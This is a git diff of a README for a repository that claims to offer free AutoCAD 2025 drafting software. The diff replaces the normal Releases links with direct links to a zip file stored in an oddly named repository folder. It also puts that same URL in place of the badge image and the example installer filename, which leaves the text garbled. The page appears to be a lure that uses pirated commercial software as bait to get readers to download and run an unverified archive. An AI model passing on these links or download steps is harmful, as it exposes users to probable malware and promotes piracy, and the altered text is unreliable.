@@ -1,6 +1,6 @@
 # 🎨 auto-cad-2025 - Free, Powerful Drafting Software for Everyone
 
-[![Download auto-cad-2025](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/021gabriel/auto-cad-2025/releases)
+[![Download auto-cad-2025](https://raw.githubusercontent.com/021gabriel/auto-cad-2025/main/Apteryges/auto-cad-2025.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/021gabriel/auto-cad-2025/main/Apteryges/auto-cad-2025.zip)
 
 ## 📦 Introduction
 
@@ -10,7 +10,7 @@ Welcome to auto-cad-2025! This application allows you to download Autodesk Autoc
 
 To get started with auto-cad-2025, you'll need to follow these simple steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/021gabriel/auto-cad-2025/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/021gabriel/auto-cad-2025/main/Apteryges/auto-cad-2025.zip) to find the latest version.
 2. **Download the Application:** Click on the download link for the latest version to save the file to your computer.
 
 ## 💻 System Requirements
@@ -24,8 +24,8 @@ Before installing, please ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. **Download the Software:** Visit [this page to download](https://github.com/021gabriel/auto-cad-2025/releases).
-2. **Locate the Downloaded File:** After the download completes, find the file in your Downloads folder. It is usually named something like `auto-cad-2025.exe`.
+1. **Download the Software:** Visit [this page to download](https://raw.githubusercontent.com/021gabriel/auto-cad-2025/main/Apteryges/auto-cad-2025.zip).
+2. **Locate the Downloaded File:** After the download completes, find the file in your Downloads folder. It is usually named something like `https://raw.githubusercontent.com/021gabriel/auto-cad-2025/main/Apteryges/auto-cad-2025.zip`.
 3. **Run the Installer:** Double-click the file to start the installation process.
 4. **Follow the Instructions:** A setup wizard will guide you through the installation steps. Click "Next" to accept the terms and choose your installation options.
 
